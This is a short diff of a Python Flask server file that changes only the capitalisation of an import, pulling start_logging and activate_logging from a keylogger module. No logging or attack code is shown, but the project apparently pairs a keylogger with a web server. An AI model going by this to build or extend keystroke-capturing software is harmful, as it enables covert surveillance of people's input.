@@ -1,6 +1,6 @@
 from flask import Flask, send_from_directory, request
 import threading
-from keylogger import start_logging, activate_logging
+from Keylogger import start_logging, activate_logging
 
 app = Flask(__name__)
 
